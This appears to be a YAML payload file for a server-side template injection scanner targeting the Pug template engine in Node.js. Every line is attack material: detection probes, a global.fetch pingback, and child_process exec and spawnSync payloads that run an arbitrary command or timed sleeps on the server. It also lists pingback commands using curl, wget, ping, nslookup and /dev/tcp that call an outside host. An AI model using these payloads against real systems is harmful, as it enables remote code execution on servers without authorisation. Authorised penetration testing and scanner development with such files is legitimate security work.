name: Pug
contexts:
  - begin: "#{"
    end: "}"
    level: 1
attack_techniques:
  - technique: "Render"
    payloads:
      - "{{.FirstNum}}*{{.SecondNum}}"
  - technique: "Blind Eval Pingback"
    payloads:
      - 'global.fetch("http://{{.PingDomain}}")'
  - technique: "Exec"
    payloads:
      - 'global.process.mainModule.require("child_process").exec("{{.Cmd}}")'
      - 'function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec("{{.Cmd}}")}()'
    commands:
      - "echo -e {{.FormattedNum}}"
      - "printf {{.FormattedNum}}"
  - technique: "Blind Exec Sleep"
    payloads:
      - 'global.process.mainModule.require("child_process").exec("sleep {{.WaitTime}}")'
      - 'function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec("sleep {{.WaitTime}}")}()'
      - "root.process.mainModule.require('child_process').spawnSync('sleep', ['{{.WaitTime}}']).stdout"
  - technique: "Blind Exec Pingback"
    payloads:
      - 'global.process.mainModule.require("child_process").exec("{{.Cmd}}")'
      - 'function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec("{{.Cmd}}")}()'
    commands:
      - "ping -c 1 {{.PingDomain}}"
      - "curl {{.PingDomain}}"
      - "host {{.PingDomain}}"
      - "nslookup {{.PingDomain}}"
      - "wget http://{{.PingDomain}}/ -O /dev/null"
      - "true < /dev/tcp/{{.PingDomain}}/80"
